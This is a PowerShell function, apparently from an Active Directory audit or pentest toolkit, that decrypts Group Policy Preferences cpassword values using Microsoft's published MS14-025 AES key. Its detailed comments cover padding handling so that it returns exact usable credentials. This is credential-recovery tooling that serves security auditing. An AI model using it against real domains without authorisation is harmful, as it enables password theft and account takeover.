<#
.SYNOPSIS
    Decrypts Group Policy Preferences (GPP) passwords using the published AES key.

.DESCRIPTION
    Microsoft published the AES-256 key used for cpassword encryption in MS14-025 (CVE-2014-1812).
    This function decrypts GPP passwords using that known key.

    GPP passwords were stored encrypted in XML files:
    - Groups.xml (local group memberships)
    - Services.xml (Windows services)
    - ScheduledTasks.xml (scheduled tasks)
    - DataSources.xml (ODBC data sources)
    - Printers.xml (printer mappings)
    - Drives.xml (network drive mappings)

.PARAMETER EncryptedPassword
    The cpassword value from GPP XML files (Base64-encoded AES-encrypted string).

.EXAMPLE
    ConvertFrom-GPPPassword -EncryptedPassword "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
    Returns: Local*P4ssword!

.EXAMPLE
    # From XML parsing
    [xml]$xml = Get-Content "Groups.xml"
    $cpassword = $xml.Groups.User.Properties.cpassword
    $plaintext = ConvertFrom-GPPPassword -EncryptedPassword $cpassword

.OUTPUTS
    String - Decrypted plaintext password

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>

function ConvertFrom-GPPPassword {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$EncryptedPassword
    )

    begin {
        Write-Log "[ConvertFrom-GPPPassword] Starting GPP password decryption"
    }

    process {
        try {
            # Validate input - must contain only Base64 characters
            if ($EncryptedPassword -notmatch '^[A-Za-z0-9+/=]+$') {
                Write-Log "[ConvertFrom-GPPPassword] Invalid Base64 format: $EncryptedPassword"
                return "[Invalid Format]"
            }

            # Fix Base64 padding (cpassword often lacks proper padding)
            $paddedPassword = $EncryptedPassword
            $mod = $paddedPassword.Length % 4
            switch ($mod) {
                1 { $paddedPassword = $paddedPassword.Substring(0, $paddedPassword.Length - 1) }
                2 { $paddedPassword += '==' }
                3 { $paddedPassword += '=' }
            }

            Write-Log "[ConvertFrom-GPPPassword] Original: $EncryptedPassword, Padded: $paddedPassword"

            # Microsoft's published AES-256 key (MS14-025), This key was intentionally published by Microsoft to deprecate GPP passwords
            $aesKeyBytes = @(
                0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,
                0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,
                0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b
            )

            Write-Log "[ConvertFrom-GPPPassword] Decoding Base64: $paddedPassword"

            # Decode Base64 to encrypted bytes
            $encryptedBytes = [System.Convert]::FromBase64String($paddedPassword)

            Write-Log "[ConvertFrom-GPPPassword] Encrypted data length: $($encryptedBytes.Length) bytes"

            # Validate encrypted data length (should be multiple of 16 for AES)
            if ($encryptedBytes.Length -eq 0 -or ($encryptedBytes.Length % 16) -ne 0) {
                Write-Log "[ConvertFrom-GPPPassword] Invalid encrypted data length: $($encryptedBytes.Length)"
                return "[Invalid Data Length]"
            }

            # Create AES decryptor
            $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            $aes.Key = $aesKeyBytes
            $aes.IV = New-Object Byte[] 16  # IV is all zeros for GPP
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            # PaddingMode::None, so the padding is removed here rather than by .NET.
            # GPP files carry both schemes - PKCS7 from the Windows tooling, zero padding
            # from some third-party writers - and .NET can only be told one of them. Asked
            # for the wrong one it either throws or leaves the padding in place.
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::None

            # Decrypt
            $decryptor = $aes.CreateDecryptor()
            $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)

            # Strip the block padding on the bytes, before anything is decoded.
            #
            # This replaces a filter that ran over the decoded characters and kept only
            # U+0020-U+007E and U+0080-U+00FF, on the assumption that "GPP passwords are
            # ASCII-safe". They are not: a Euro sign, a tab, or any Cyrillic, Greek or CJK
            # character was silently dropped and the function returned a password that was
            # not the password - "P@ss<euro>w0rd" came back as "P@ssw0rd". For a tool whose
            # output someone then authenticates with, a quietly wrong credential is worse
            # than a reported failure: it costs a failed logon against a monitored account.
            #
            # The filter existed because PaddingMode::Zeros leaves PKCS7 padding in the
            # output, where bytes 0x0C or 0x02 decode to U+0C0C and U+0202 - the "padding
            # artifacts" the old comment named. Removing the padding properly removes the
            # reason for the filter.
            $len = $decryptedBytes.Length

            # PKCS7: the last byte gives the pad length, and every padding byte repeats it.
            if ($len -gt 0) {
                $padLength = [int]$decryptedBytes[$len - 1]
                if ($padLength -ge 1 -and $padLength -le 16 -and $padLength -le $len) {
                    $isPKCS7 = $true
                    for ($i = $len - $padLength; $i -lt $len; $i++) {
                        if ($decryptedBytes[$i] -ne $padLength) { $isPKCS7 = $false; break }
                    }
                    if ($isPKCS7) { $len -= $padLength }
                }
            }

            # Zero padding, removed in UTF-16 code units rather than in bytes. Any ASCII
            # character ends in a zero byte in UTF-16LE - "abc" is 61 00 62 00 63 00 - so
            # trimming single zero bytes would eat the encoding itself.
            while ($len -ge 2 -and $decryptedBytes[$len - 1] -eq 0 -and $decryptedBytes[$len - 2] -eq 0) {
                $len -= 2
            }

            # A UTF-16LE string is an even number of bytes. An odd count means the data was
            # not what this function was told it was, and decoding it would invent a
            # character out of one byte.
            if (($len % 2) -ne 0) { $len-- }

            $decryptedPassword = if ($len -gt 0) {
                [System.Text.Encoding]::Unicode.GetString($decryptedBytes, 0, $len)
            } else {
                ''
            }

            # Cleanup
            $decryptor.Dispose()
            $aes.Dispose()

            Write-Log "[ConvertFrom-GPPPassword] Decryption successful"

            return $decryptedPassword

        } catch [System.FormatException] {
            Write-Log "[ConvertFrom-GPPPassword] Base64 decode error: $_"
            return "[Base64 Decode Failed]"

        } catch [System.Security.Cryptography.CryptographicException] {
            Write-Log "[ConvertFrom-GPPPassword] Decryption error: $_"
            return "[Decryption Failed]"

        } catch {
            Write-Log "[ConvertFrom-GPPPassword] Unexpected error: $_"
            return "[Decryption Failed]"
        }
    }

    end {
        Write-Log "[ConvertFrom-GPPPassword] Decryption completed"
    }
}
